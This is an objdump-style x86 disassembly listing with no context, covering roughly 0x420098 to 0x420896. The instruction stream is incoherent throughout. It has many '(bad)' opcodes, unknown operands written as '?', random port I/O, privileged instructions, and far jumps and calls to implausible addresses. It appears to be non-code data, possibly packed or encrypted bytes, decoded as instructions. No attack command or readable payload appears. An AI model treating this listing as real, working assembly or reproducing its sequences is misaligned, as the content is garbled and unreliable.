  420098:	inc    ebp
  420099:	adc    DWORD PTR [edx-0x1190f49b],edx
  42009f:	seta   BYTE PTR [esi-0x60]
  4200a3:	add    ebp,DWORD PTR [edx]
  4200a5:	mov    edx,0x54b078f6
  4200aa:	cdq    
  4200ab:	sub    edi,0x3b
  4200ae:	and    DWORD PTR [edi-0x4a],eax
  4200b1:	push   eax
  4200b2:	jl     0x42004a
  4200b4:	in     al,dx
  4200b5:	int3   
  4200b6:	cwde   
  4200b7:	rcl    DWORD PTR [ebp-0x7b],1
  4200ba:	jae    0x4200a5
  4200bc:	jge    0x420074
  4200be:	cmp    bh,BYTE PTR [eax+0x56]
  4200c1:	lds    ecx,FWORD PTR [edx+eax*2]
  4200c4:	jecxz  0x420099
  4200c6:	out    dx,al
  4200c7:	and    eax,0x4fb087b
  4200cc:	cmp    ecx,DWORD PTR [ebx+0x44]
  4200cf:	or     esp,esi
  4200d1:	sbb    edx,DWORD PTR [edx+0x57]
  4200d4:	in     al,0xc9
  4200d6:	jmp    0xaabb:0x9d52ad30
  4200dd:	sbb    DWORD PTR [edx-0x53ac4c32],edi
  4200e3:	jecxz  0x420125
  4200e5:	stc    
  4200e6:	mov    eax,0x204c0ae7
  4200eb:	mov    edx,0xb50d7dd
  4200f0:	dec    esi
  4200f1:	mov    esi,0xef2281a6
  4200f6:	rcr    ebp,0x49
  4200f9:	inc    ebx
  4200fa:	push   ss
  4200fb:	jae    0x4200a1
  4200fd:	mov    ebx,0xab93da47
  420102:	push   eax
  420103:	aam    0xf3
  420105:	push   edx
  420106:	les    eax,FWORD PTR [esi]
  420108:	xor    al,0x2c
  42010a:	jo     0x4200a1
  42010c:	dec    edi
  42010d:	cld    
  42010e:	ror    BYTE PTR [ebx-0x6de69502],1
  420114:	pushf  
  420115:	mov    ch,0xd0
  420117:	jbe    0x420178
  420119:	xchg   esi,eax
  42011a:	dec    edx
  42011b:	push   es
  42011c:	sbb    DWORD PTR [ecx+0x7],0xaa2147f8
  420123:	push   ds
  420124:	fs add al,0x2f
  420127:	call   0xb8b9aaf4
  42012c:	cdq    
  42012d:	(bad)  
  42012f:	xchg   BYTE PTR [esi-0x5a],bh
  420132:	mov    ebp,0x8b6e7201
  420137:	in     eax,0xe3
  420139:	stos   DWORD PTR es:[edi],eax
  42013a:	repnz into 
  42013c:	fisubr WORD PTR es:[ecx-0x3229294e]
  420143:	(bad)  
  420144:	inc    eax
  420145:	fdiv   DWORD PTR [esi]
  420147:	aam    0x92
  420149:	lods   al,BYTE PTR ds:[esi]
  42014a:	sub    BYTE PTR [eax+0x21347731],dh
  420150:	dec    edx
  420151:	mov    eax,0xf2303421
  420156:	sbb    esi,DWORD PTR [edi-0x28]
  420159:	sub    bl,bl
  42015b:	retf   
  42015c:	sub    BYTE PTR ds:0xd1aa6edb,bh
  420162:	les    edi,FWORD PTR [eax]
  420164:	sub    BYTE PTR [eax-0x72],dl
  420167:	aad    0xdb
  420169:	mov    ecx,edi
  42016b:	push   0xffffff8c
  42016d:	mov    ch,0x39
  42016f:	pop    DWORD PTR [ebx-0x77]
  420172:	xlat   BYTE PTR ds:[ebx]
  420173:	out    0x94,al
  420175:	cli    
  420176:	data16 or bp,WORD PTR [edi]
  42017a:	pop    ecx
  42017b:	pop    edi
  42017c:	sbb    DWORD PTR [edi],esi
  42017e:	push   ds
  42017f:	icebp  
  420180:	push   ebp
  420181:	vunpckhps xmm7,xmm4,XMMWORD PTR [ebp-0x6dd5be21]
  420189:	lods   al,BYTE PTR ds:[esi]
  42018a:	out    0x51,eax
  42018c:	cs push edx
  42018e:	dec    ecx
  42018f:	test   DWORD PTR [esi+0x555c97ee],0xf2f8cf20
  420199:	out    dx,al
  42019a:	sbb    DWORD PTR [eax],ebx
  42019c:	fst    DWORD PTR [esp+ebp*1-0x11]
  4201a0:	dec    ebx
  4201a1:	mov    esi,0x1e91b992
  4201a6:	cmp    edx,DWORD PTR [edi+0x4b]
  4201a9:	stos   DWORD PTR es:[edi],eax
  4201aa:	fdivp  st(0),st
  4201ac:	xchg   esp,ebp
  4201ae:	xchg   DWORD PTR [edx+0x2c],ecx
  4201b1:	outs   dx,DWORD PTR ds:[esi]
  4201b2:	test   eax,0xfdf7c3e7
  4201b7:	xchg   esp,eax
  4201b8:	sbb    eax,edi
  4201ba:	(bad)  
  4201bb:	cmp    eax,0x2aef9ad5
  4201c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201c1:	inc    edx
  4201c2:	fdiv   st,st(4)
  4201c4:	or     cl,BYTE PTR [eax]
  4201c6:	add    eax,0x297eb71c
  4201cb:	ins    BYTE PTR es:[edi],dx
  4201cc:	fimul  WORD PTR [edi+0x358895cc]
  4201d2:	dec    ebp
  4201d3:	or     DWORD PTR [esi+0x5256dbce],edi
  4201d9:	fistp  QWORD PTR [ebx]
  4201db:	or     DWORD PTR [ebp-0x17f94019],eax
  4201e1:	inc    esi
  4201e2:	dec    edx
  4201e3:	fdivr  QWORD PTR [ebx]
  4201e5:	jno    0x4201db
  4201e7:	ror    DWORD PTR [esi-0xaba6d92],1
  4201ed:	jns    0x4201ef
  4201ef:	rdtsc  
  4201f1:	popf   
  4201f2:	xchg   esp,eax
  4201f3:	push   edi
  4201f4:	add    eax,eax
  4201f6:	movntq QWORD PTR ds:0xdb0da344,mm1
  4201fd:	enter  0x6af,0xc5
  420201:	cmp    al,bl
  420203:	xor    eax,0x7518e00c
  420208:	add    al,0x38
  42020a:	inc    ebp
  42020b:	xchg   esp,eax
  42020c:	sbb    al,al
  42020e:	push   edi
  42020f:	mov    esp,0x5844a865
  420214:	popf   
  420215:	and    edx,DWORD PTR [edx]
  420217:	jmp    0x42026d
  420219:	or     BYTE PTR [eax],dl
  42021b:	jecxz  0x420294
  42021d:	bound  esp,QWORD PTR [eax+esi*2]
  420220:	retf   0xa539
  420223:	rol    BYTE PTR ds:0x65decd4a,0x18
  42022a:	(bad)  
  42022b:	fisubr DWORD PTR [ebx+0x1]
  42022e:	pop    esp
  42022f:	sbb    eax,0x8ea5467f
  420234:	xor    edx,DWORD PTR [ecx-0x14]
  420237:	and    esp,esp
  420239:	add    eax,0xd57645ce
  42023e:	clc    
  42023f:	(bad)  
  420240:	imul   ebp,esi,0x2f271f14
  420246:	sub    eax,0x5b6e1660
  42024b:	neg    al
  42024d:	jmp    0xa5a50e66
  420252:	rcl    DWORD PTR [eax+edi*4+0x6d68da6],1
  420259:	xor    eax,0x36325da1
  42025e:	leave  
  42025f:	jmp    0xee64:0xb5e169f1
  420266:	adc    DWORD PTR [esi],esp
  420268:	sub    ebx,DWORD PTR [esi]
  42026a:	shr    DWORD PTR [edx],cl
  42026c:	mov    ecx,DWORD PTR [eax+0x63]
  42026f:	sbb    al,0xc7
  420271:	pop    ebx
  420272:	dec    esi
  420273:	jb     0x4202a5
  420275:	xchg   esp,eax
  420276:	add    bl,BYTE PTR [edi-0x62]
  420279:	inc    ebx
  42027a:	or     ch,bl
  42027c:	gs jg  0x420235
  42027f:	push   edx
  420280:	outs   dx,BYTE PTR ds:[esi]
  420281:	pop    eax
  420282:	mov    esp,0x27f1db29
  420287:	mov    DWORD PTR [ecx+0xc046a41],esp
  42028d:	mov    ch,0x1d
  42028f:	xchg   edx,eax
  420290:	mov    al,0xf4
  420292:	inc    ebx
  420293:	mov    edx,0x4864507
  420298:	cld    
  420299:	lods   al,BYTE PTR ds:[esi]
  42029a:	sub    BYTE PTR [ecx+0x2e6408e7],cl
  4202a0:	inc    eax
  4202a1:	pop    edx
  4202a2:	fild   WORD PTR [edi+0x5847468b]
  4202a8:	pop    esp
  4202a9:	dec    ebp
  4202aa:	add    eax,0xb65f09cc
  4202af:	mov    DWORD PTR [edx+0x35dd1433],edi
  4202b5:	mov    ecx,0x679d016c
  4202ba:	add    bh,BYTE PTR [ecx]
  4202bc:	popf   
  4202bd:	aaa    
  4202be:	mov    ebx,0x4e71f826
  4202c3:	dec    esp
  4202c4:	mov    ebx,0x7b7a6445
  4202c9:	push   esi
  4202ca:	ins    BYTE PTR es:[edi],dx
  4202cb:	aad    0xd9
  4202cd:	les    edi,FWORD PTR [eax]
  4202cf:	repnz push ebx
  4202d1:	test   DWORD PTR ds:0xc91e04ee,0x782e7071
  4202db:	xchg   edi,eax
  4202dc:	dec    esp
  4202dd:	xor    cl,BYTE PTR [ebp+0x48a2b570]
  4202e3:	(bad)  
  4202e4:	fcom   st(4)
  4202e6:	mov    edi,DWORD PTR [edi]
  4202e8:	xchg   edx,eax
  4202e9:	adc    al,0x26
  4202eb:	inc    eax
  4202ed:	frstor [edx+0x70acecc0]
  4202f3:	cmovl  esi,ebp
  4202f6:	inc    ebx
  4202f7:	lods   al,BYTE PTR ds:[esi]
  4202f8:	push   cs
  4202f9:	fiadd  WORD PTR [edi+0x8]
  4202fc:	(bad)  
  4202fd:	std    
  4202fe:	lea    esi,[esi]
  420300:	lds    ebp,FWORD PTR [esi]
  420302:	push   ds
  420303:	pop    ds
  420304:	add    eax,0xe2b14c37
  420309:	xchg   esi,eax
  42030a:	outs   dx,BYTE PTR ds:[esi]
  42030b:	bound  ecx,QWORD PTR [eax+ebp*8+0x4b]
  42030f:	test   eax,0xdd8badb
  420314:	pushf  
  420315:	and    ebp,DWORD PTR ds:0xbbd138f3
  42031b:	mov    es,WORD PTR [esi+0x2]
  42031e:	ret    0x1f85
  420321:	mov    eax,0xbb062451
  420326:	dec    edx
  420327:	and    BYTE PTR [esi-0x2878dd88],ch
  42032d:	mov    esi,?
  42032f:	push   esp
  420330:	ins    DWORD PTR es:[edi],dx
  420331:	push   es
  420332:	sti    
  420333:	int3   
  420334:	and    eax,0xab84ea16
  420339:	ret    0x887c
  42033c:	mov    ds:0x8a63ce53,al
  420341:	jecxz  0x420359
  420343:	icebp  
  420344:	jp     0x420397
  420346:	data16 and BYTE PTR ds:0x105a2b67,al
  42034d:	add    al,0xa4
  42034f:	sub    dh,BYTE PTR [eax-0x3f1f48b2]
  420355:	mul    BYTE PTR [ecx]
  420357:	jl     0x42037f
  420359:	add    al,0x54
  42035b:	sub    BYTE PTR [ecx+0x11d8f19c],0x90
  420362:	dec    esi
  420363:	cmp    eax,0xd0e8c8d8
  420368:	loopne 0x4203d4
  42036a:	jle    0x4203bc
  42036c:	js     0x420383
  42036e:	test   bh,bl
  420370:	xor    edi,0x789005dc
  420376:	cmp    BYTE PTR [ebx-0x45],bh
  420379:	mov    eax,0xbfc9c057
  42037e:	push   0x7e
  420380:	mov    bh,0x79
  420382:	ja     0x42033f
  420384:	jg     0x4203ef
  420386:	daa    
  420387:	ja     0x42033f
  420389:	js     0x42033a
  42038b:	fs adc eax,0xb4848bb6
  420391:	xor    edi,esi
  420393:	pop    ecx
  420394:	sahf   
  420395:	push   edi
  420396:	(bad)  
  420397:	out    dx,eax
  420398:	pop    es
  420399:	out    dx,eax
  42039a:	pop    ebx
  42039b:	jg     0x42040a
  42039d:	push   eax
  42039e:	xchg   ebx,eax
  42039f:	mov    BYTE PTR ds:0xdb4e26b5,dh
  4203a5:	fimul  WORD PTR [ecx]
  4203a7:	lds    ebx,FWORD PTR [eax+0x23]
  4203aa:	adc    al,0x56
  4203ac:	mov    eax,ds:0x2aea2eb4
  4203b1:	stos   DWORD PTR es:[edi],eax
  4203b2:	js     0x42038a
  4203b4:	xchg   ebx,eax
  4203b5:	ror    BYTE PTR [ecx+0x408f27ef],1
  4203bb:	xchg   esi,eax
  4203bc:	inc    eax
  4203bd:	xchg   esi,eax
  4203be:	jp     0x42036d
  4203c0:	mov    eax,0x140a8d9d
  4203c5:	xchg   BYTE PTR [ecx],bh
  4203c7:	mov    ecx,0xcfa9f054
  4203cc:	or     dl,BYTE PTR fs:[ecx+ecx*1+0xaf4bbff]
  4203d4:	dec    esi
  4203d5:	mov    al,ah
  4203d7:	and    ah,bh
  4203d9:	mov    al,ds:0xf570b2b7
  4203de:	bound  esi,QWORD PTR [ebp+0x7a47dd7d]
  4203e4:	in     al,0x43
  4203e6:	test   DWORD PTR [eax+0x4160877d],edi
  4203ec:	xchg   edx,eax
  4203ed:	(bad)
  4203f1:	enter  0xa344,0xb3
  4203f5:	aas    
  4203f6:	test   BYTE PTR [ebx+esi*1-0x5df836ec],ah
  4203fd:	es in  al,0xea
  420400:	adc    ebp,DWORD PTR [esi+0x55cce234]
  420406:	pushf  
  420407:	je     0x420411
  420409:	xlat   BYTE PTR ds:[ebx]
  42040a:	jmp    0x14facaad
  42040f:	jmp    0x420415
  420411:	mov    ds:0x38cd876a,al
  420416:	jge    0x420435
  420418:	mov    edi,0x4ebbe055
  42041d:	leavew 
  42041f:	xchg   ecx,eax
  420420:	add    DWORD PTR [ebx+0x6d82915f],edx
  420426:	popa   
  420427:	sbb    al,0x33
  420429:	sub    al,0xf4
  42042b:	cmp    BYTE PTR [edi+0x13],0x9c
  42042f:	jae    0x42047a
  420431:	mov    ebx,0x9ab63a7a
  420436:	stos   DWORD PTR es:[edi],eax
  420437:	xchg   esi,eax
  420438:	in     al,dx
  420439:	sbb    DWORD PTR [esi+0x1b],esp
  42043c:	les    edi,FWORD PTR [edi+0x50]
  42043f:	xor    DWORD PTR [eax],esp
  420441:	sbb    ah,bh
  420443:	mov    ch,0x13
  420445:	pop    ecx
  420446:	push   es
  420447:	mov    esi,0xd566693
  42044c:	dec    edi
  42044d:	sti    
  42044e:	push   ds
  42044f:	addr16 mov esp,0x7904bb1c
  420455:	or     bh,BYTE PTR [ebp-0x1e2d122f]
  42045b:	mov    esp,0x9798e2ba
  420460:	mov    ?,esp
  420462:	or     al,0x16
  420464:	inc    esp
  420465:	xchg   ebp,eax
  420466:	sbb    ah,al
  420468:	fsub   st,st(5)
  42046a:	mov    ds:0xddc09768,al
  42046f:	(bad)  [edx-0x53cf6112]
  420475:	sub    esp,ebx
  420477:	push   ebx
  420478:	dec    esp
  420479:	mov    edi,0x6025abb
  42047e:	ss (bad) 
  420480:	sbb    DWORD PTR [edi],esp
  420482:	icebp  
  420483:	in     al,0x45
  420485:	or     bl,BYTE PTR [ebx-0x6d]
  420488:	jp     0x420460
  42048a:	mov    ds:0xc22bff79,eax
  42048f:	and    al,0xc9
  420491:	in     al,dx
  420492:	stc    
  420493:	int    0xe0
  420495:	dec    esp
  420496:	inc    eax
  420497:	mov    eax,ds:0x65c6880a
  42049c:	jecxz  0x420429
  42049e:	clc    
  42049f:	jp     0x420497
  4204a1:	mov    eax,0xf3fce709
  4204a6:	inc    ebp
  4204a7:	add    DWORD PTR [edi],esp
  4204a9:	test   al,0x6b
  4204ab:	add    ebp,edx
  4204ad:	pop    edx
  4204ae:	or     esi,esi
  4204b0:	cmp    ebp,edi
  4204b2:	cmp    al,0x79
  4204b4:	and    eax,0xc045d753
  4204b9:	mov    gs,WORD PTR [edx+0x92f0fe5]
  4204bf:	fs dec esi
  4204c1:	pushf  
  4204c2:	mov    DWORD PTR [eax],eax
  4204c4:	jno    0x42044e
  4204c6:	pusha  
  4204c7:	int3   
  4204c8:	sub    dl,BYTE PTR [edx-0x351f821d]
  4204ce:	xor    bh,al
  4204d0:	jnp    0x4204d2
  4204d2:	adc    BYTE PTR [ecx+0x5ad47021],ah
  4204d8:	data16 shl BYTE PTR [ebp-0x6d3e3d60],cl
  4204df:	push   edx
  4204e0:	(bad)  
  4204e1:	sbb    eax,0x39414dfa
  4204e6:	rcr    BYTE PTR [esp+edx*2],1
  4204e9:	inc    edx
  4204ea:	in     eax,0x93
  4204ec:	scas   eax,DWORD PTR es:[edi]
  4204ed:	cmc    
  4204ee:	xor    al,0xa6
  4204f0:	add    DWORD PTR es:[edx],0xd83034e6
  4204f7:	pop    esi
  4204f8:	out    dx,eax
  4204f9:	and    edx,DWORD PTR fs:[esi+ecx*8-0x2e]
  4204fe:	(bad)  
  4204ff:	fiadd  DWORD PTR [edx+ecx*2]
  420502:	repnz inc esi
  420504:	call   0x5541:0xaa35e3a9
  42050b:	mov    edi,0x62bc1cea
  420510:	sahf   
  420511:	or     ch,dl
  420513:	sub    eax,0xe8564952
  420518:	jno    0x420575
  42051a:	scas   al,BYTE PTR es:[edi]
  42051b:	clc    
  42051c:	and    eax,DWORD PTR [eax]
  42051e:	xor    bl,BYTE PTR [eax-0x1b]
  420521:	leave  
  420522:	inc    edi
  420523:	jb     0x4204b8
  420525:	cs xor eax,0xb2a46c4e
  42052b:	sub    bh,BYTE PTR [edi-0xa]
  42052e:	add    eax,0xbe36d061
  420533:	dec    ebx
  420534:	push   esi
  420535:	test   DWORD PTR [ecx+0x1d],eax
  420538:	test   BYTE PTR [esi+esi*4+0x26],ch
  42053c:	mov    ebp,0xa44177ce
  420541:	pop    esi
  420542:	addr16 das 
  420544:	rcl    esp,cl
  420546:	push   es
  420547:	mov    eax,0x3136f782
  42054c:	dec    ecx
  42054d:	aad    0xc4
  42054f:	inc    ecx
  420550:	jmp    0xbd2e53cd
  420555:	jo     0x420515
  420557:	lods   al,BYTE PTR ds:[esi]
  420558:	es mov eax,0xfa198890
  42055e:	cmc    
  42055f:	lahf   
  420560:	adc    ch,BYTE PTR [ebp-0x36]
  420563:	jg     0x420527
  420565:	cld    
  420566:	imul   ebp,DWORD PTR [ebx],0x17
  420569:	in     al,dx
  42056a:	add    bh,BYTE PTR [ebx-0x5b]
  42056d:	push   ebx
  42056e:	cli    
  42056f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420570:	jno    0x420529
  420572:	in     eax,0xc
  420574:	or     eax,0x9de9935e
  420579:	popf   
  42057a:	(bad)  [eax]
  42057c:	enter  0x49b6,0xa
  420580:	pop    ecx
  420581:	ror    BYTE PTR [edi+0x375fa18f],cl
  420587:	xor    BYTE PTR [edx],0xf3
  42058a:	sub    DWORD PTR [eax-0x34],ecx
  42058d:	popf   
  42058e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058f:	shl    BYTE PTR [edi-0x1d067a71],cl
  420595:	xor    cl,BYTE PTR [ebx-0x5f]
  420598:	fsubr  st,st(2)
  42059a:	int    0x9a
  42059c:	dec    edi
  42059d:	jae    0x420589
  42059f:	(bad)  
  4205a0:	das    
  4205a1:	cmp    dh,BYTE PTR [esi+0x7ee58731]
  4205a7:	mov    BYTE PTR [esi],bh
  4205a9:	or     dh,ah
  4205ab:	mov    ds:0xd5f5eb5b,al
  4205b0:	xchg   ebx,eax
  4205b1:	pop    esi
  4205b2:	(bad)  
  4205b3:	push   ecx
  4205b4:	sbb    ebx,eax
  4205b6:	dec    ecx
  4205b7:	in     al,0x91
  4205b9:	fimul  DWORD PTR [edi-0x74b47cfc]
  4205bf:	lods   al,BYTE PTR ds:[esi]
  4205c0:	pop    ebp
  4205c1:	mov    ebx,ebp
  4205c3:	cmp    BYTE PTR [eax+0x1c827c27],bl
  4205c9:	jp     0x42057c
  4205cb:	sbb    DWORD PTR ds:0x811c83bb,esp
  4205d1:	call   0x9bd890b8
  4205d6:	push   ebp
  4205d7:	inc    edx
  4205d8:	xor    eax,0xa2d8bbea
  4205dd:	jns    0x42059e
  4205df:	sbb    eax,0x20830d99
  4205e4:	outs   dx,DWORD PTR ds:[esi]
  4205e5:	loop   0x4205d3
  4205e7:	cmp    DWORD PTR [esp+edx*1-0x3d9e40bc],edi
  4205ee:	out    dx,al
  4205ef:	out    dx,eax
  4205f0:	fwait
  4205f1:	idiv   BYTE PTR [edx+0x16]
  4205f4:	call   0xf5f7d0cc
  4205f9:	adc    esi,edi
  4205fb:	ret    0x4a03
  4205fe:	sub    BYTE PTR cs:[ebp+0xcb9ca09],ah
  420605:	and    ebx,DWORD PTR [ecx+ecx*1-0x1d]
  420609:	es out dx,al
  42060b:	sbb    esi,DWORD PTR [ebx]
  42060d:	and    al,0xf5
  42060f:	push   cs
  420610:	adc    DWORD PTR [esi-0x31],0x30e65098
  420617:	out    dx,al
  420618:	pop    ss
  420619:	scas   al,BYTE PTR es:[edi]
  42061a:	cmp    ch,BYTE PTR [edx]
  42061c:	xor    ebp,DWORD PTR [ecx+0xf62e806]
  420622:	mov    al,ds:0x7f8bbf38
  420627:	pop    ds
  420628:	pop    ecx
  420629:	fistp  QWORD PTR [ebp+0x46]
  42062c:	xchg   dh,ch
  42062e:	or     edx,DWORD PTR [eax]
  420630:	stos   BYTE PTR es:[edi],al
  420631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420632:	pop    edi
  420633:	bound  edx,QWORD PTR [ecx+0x6a6399fc]
  420639:	jmp    0x420679
  42063b:	std    
  42063c:	bound  esi,QWORD PTR [ebx+0x1e90b33a]
  420642:	sub    bl,ah
  420644:	aaa    
  420645:	pop    ds
  420646:	inc    esi
  420647:	adc    al,0xad
  420649:	jno    0x4205d6
  42064b:	loopne 0x420644
  42064d:	nop
  42064e:	loopne 0x4205df
  420650:	and    eax,0xf5f3fcba
  420655:	mov    dh,0x1e
  420657:	cmp    ah,bl
  420659:	dec    ebp
  42065a:	sbb    BYTE PTR [esi+eax*2-0x7f],ah
  42065e:	and    DWORD PTR [ecx+0x1c],0xffffffea
  420662:	xchg   edi,eax
  420663:	jo     0x420617
  420665:	and    DWORD PTR [esi+0x17403f94],eax
  42066b:	sub    eax,0x20249c69
  420670:	fs ja  0x420656
  420673:	push   esp
  420674:	jno    0x420685
  420676:	xor    edi,DWORD PTR [ebx-0x27]
  420679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42067a:	popf   
  42067b:	inc    ecx
  42067c:	xchg   DWORD PTR cs:[ecx],eax
  42067f:	inc    esi
  420680:	std    
  420681:	push   ebp
  420682:	ror    BYTE PTR [ecx+0x22],cl
  420685:	imul   eax,DWORD PTR [esi-0x17],0xf4695409
  42068c:	or     DWORD PTR [di],eax
  42068f:	jcxz   0x42062a
  420692:	push   ds
  420693:	call   0x5be6:0xef74b815
  42069a:	aas    
  42069b:	into   
  42069c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42069d:	call   0x38db:0xca68fd9e
  4206a4:	cmp    DWORD PTR [edx+ebx*4+0x64],eax
  4206a8:	rol    DWORD PTR [edx-0x12c2039f],cl
  4206ae:	and    cl,BYTE PTR [eax+ecx*1+0x1a]
  4206b2:	add    BYTE PTR [ecx+0x7a],dl
  4206b5:	and    BYTE PTR [edx+eiz*4],bh
  4206b8:	fwait
  4206b9:	jbe    0x42068c
  4206bb:	cmovb  ecx,DWORD PTR [eax+esi*1+0x3fb7cf55]
  4206c3:	dec    esi
  4206c4:	xchg   edi,ecx
  4206c6:	mov    bh,0xb
  4206c8:	addr16 ja 0x4206f6
  4206cb:	jno    0x4206ca
  4206cd:	(bad)  
  4206ce:	pop    ds
  4206cf:	sub    BYTE PTR [esi-0x4c],0xc6
  4206d3:	data16 in al,dx
  4206d5:	popa   
  4206d6:	mov    dl,ch
  4206d8:	pmulhw mm3,QWORD PTR [edx-0xca348f1]
  4206df:	sti    
  4206e0:	out    dx,al
  4206e1:	xor    edx,DWORD PTR [edx+0x33]
  4206e4:	repnz pop eax
  4206e6:	and    dh,BYTE PTR [edx-0x61ff0b0c]
  4206ec:	sbb    eax,0xa1d86cb8
  4206f1:	scas   al,BYTE PTR es:[edi]
  4206f2:	sub    al,0xac
  4206f4:	jo     0x420739
  4206f6:	js     0x4206c4
  4206f8:	fidivr DWORD PTR [ecx]
  4206fa:	imul   esp,DWORD PTR [eax-0x628d6aa7],0xffffffb6
  420701:	call   FWORD PTR [eax]
  420703:	pop    esi
  420704:	push   0x7d
  420706:	add    eax,0x612b117a
  42070b:	repz test eax,0x2dc6e19a
  420711:	dec    esi
  420712:	scas   al,BYTE PTR es:[edi]
  420713:	mov    ebx,0x956802ab
  420718:	add    dh,al
  42071a:	and    bh,dh
  42071c:	jbe    0x420737
  42071e:	in     al,0x88
  420720:	lea    eax,[ebp+0x72]
  420723:	lahf   
  420724:	aaa    
  420725:	das    
  420726:	enter  0xcb44,0x21
  42072a:	cmp    ebx,DWORD PTR [ecx]
  42072c:	pop    edx
  42072d:	pusha  
  42072e:	dec    edx
  42072f:	push   eax
  420730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420731:	jmp    0x420721
  420733:	sbb    al,0xee
  420735:	xchg   ebx,eax
  420736:	dec    edi
  420737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420738:	cmc    
  420739:	fcom   DWORD PTR [eax]
  42073b:	in     al,0xb0
  42073d:	ss call 0xc919:0xdbfe15c0
  420745:	call   0x4327cbf4
  42074a:	xchg   BYTE PTR [ebx-0x6add5a01],bh
  420750:	jecxz  0x420705
  420752:	and    edi,edx
  420754:	xchg   ecx,eax
  420755:	ds xchg esp,eax
  420757:	stos   DWORD PTR es:[edi],eax
  420758:	mov    edi,0x9623b08a
  42075d:	sbb    bl,BYTE PTR [edx-0xe]
  420760:	out    0x7c,eax
  420762:	sahf   
  420763:	and    BYTE PTR [ecx],al
  420765:	outs   dx,BYTE PTR ds:[esi]
  420766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420767:	cmp    al,0x57
  420769:	aas    
  42076a:	out    0x3e,al
  42076c:	leave  
  42076d:	ss push edx
  42076f:	mov    bh,0x3
  420771:	mov    ebp,0xd2f0ce49
  420776:	je     0x42075d
  420778:	shl    edi,0x23
  42077b:	jb     0x4207ca
  42077d:	mov    esi,0x61a7235e
  420782:	shl    ch,0x4f
  420785:	push   ss
  420786:	cmp    eax,0xd1cc7e7a
  42078b:	push   ss
  42078c:	rcr    bl,1
  42078e:	sbb    dl,dh
  420790:	jo     0x420729
  420792:	call   0x2fe74f55
  420797:	mov    BYTE PTR [ecx+0x1bbc9c6e],0x97
  42079e:	cmp    edi,DWORD PTR [ebx]
  4207a0:	xor    ah,al
  4207a2:	sbb    DWORD PTR [edx+eiz*1],esi
  4207a5:	js     0x4207cc
  4207a7:	pop    ebp
  4207a8:	push   ebx
  4207a9:	retf   0xfa80
  4207ac:	pop    edi
  4207ad:	pop    eax
  4207ae:	sub    BYTE PTR [eax],ah
  4207b0:	popf   
  4207b1:	aam    0x86
  4207b3:	mov    esi,0x2aef4f43
  4207b8:	ja     0x420757
  4207ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207bb:	dec    edx
  4207bc:	push   0xbd6474c1
  4207c1:	(bad)  
  4207c2:	inc    ebp
  4207c3:	cli    
  4207c4:	mov    dl,0xb
  4207c6:	shr    DWORD PTR [ecx+edx*8],cl
  4207c9:	scas   al,BYTE PTR es:[edi]
  4207ca:	dec    edi
  4207cb:	sbb    al,0xa5
  4207cd:	frstor [ecx+0x23]
  4207d0:	push   ebx
  4207d1:	xchg   al,dl
  4207d3:	pop    edi
  4207d4:	sub    DWORD PTR [ecx],0xffffffd5
  4207d7:	ss mov bl,0xcb
  4207da:	xlat   BYTE PTR ds:[ebx]
  4207db:	mov    esi,0x33630ee2
  4207e0:	cmp    BYTE PTR [ebx+0x53],dh
  4207e3:	or     ah,BYTE PTR [esi-0x6d1ad252]
  4207e9:	mov    ds:0xf410dbf1,eax
  4207ee:	mov    dh,0x8d
  4207f0:	dec    BYTE PTR [edx+0x38f50bff]
  4207f6:	(bad)  
  4207f7:	mov    ebp,0xe00067fb
  4207fc:	mov    es,WORD PTR [eax+ebx*2+0x27]
  420800:	enter  0x4d33,0xff
  420804:	xchg   esi,eax
  420805:	jae    0x4207c0
  420807:	push   ecx
  420808:	leave  
  420809:	or     BYTE PTR [edx],dl
  42080b:	inc    ebp
  42080c:	inc    ebp
  42080d:	xor    eax,0x14ec6e2c
  420812:	adc    eax,0xf10368a
  420817:	sub    BYTE PTR [edi],al
  420819:	mov    ecx,edx
  42081b:	fnstcw WORD PTR [ebx]
  42081d:	push   bx
  42081f:	out    0x19,eax
  420821:	xchg   edx,eax
  420822:	imul   ebp,DWORD PTR [ebx],0x430279a8
  420828:	push   es
  420829:	outs   dx,BYTE PTR ds:[esi]
  42082a:	imul   edi,DWORD PTR [edx-0x12],0x1c
  42082e:	aad    0xb9
  420830:	sti    
  420831:	fdivr  DWORD PTR [edx]
  420833:	ds adc al,0xbb
  420836:	in     eax,dx
  420837:	pop    esi
  420838:	pop    ebp
  420839:	std    
  42083a:	scas   al,BYTE PTR es:[edi]
  42083b:	add    ah,ch
  42083d:	test   DWORD PTR [esi],esp
  42083f:	and    DWORD PTR [eax-0x128a2c22],eax
  420845:	sub    BYTE PTR [esi-0x629e2a4b],0x90
  42084c:	adc    ecx,DWORD PTR [ecx+edx*4-0x6168b2e9]
  420853:	or     DWORD PTR [edi-0x13],ebp
  420856:	pop    esi
  420857:	xor    BYTE PTR [ebx],dh
  420859:	jae    0x420833
  42085b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42085c:	rol    BYTE PTR [ebx+ebx*2+0x45],0x7f
  420861:	xor    DWORD PTR [ecx-0x64],esp
  420864:	mov    al,BYTE PTR [ebx]
  420866:	and    BYTE PTR [ecx],ch
  420868:	js     0x4208c5
  42086a:	add    al,0xa3
  42086c:	sub    edx,DWORD PTR [ecx+0x43]
  42086f:	lsl    ecx,WORD PTR [eax-0x32f57445]
  420876:	xchg   esp,eax
  420877:	pop    ecx
  420878:	add    esp,edx
  42087a:	xor    cl,BYTE PTR [ebp+edi*1+0x1a]
  42087e:	lods   eax,DWORD PTR ds:[esi]
  42087f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420880:	ss (bad) 
  420882:	out    0x5a,eax
  420884:	push   eax
  420885:	out    0xb1,eax
  420887:	xchg   ebx,eax
  420888:	jb     0x4208ff
  42088a:	(bad)  
  42088b:	mov    eax,ds:0x88b2fb13
  420890:	xor    al,0x36
  420892:	mov    bl,0x2d
  420894:	loope  0x4208ad
  420896:	out    dx,al
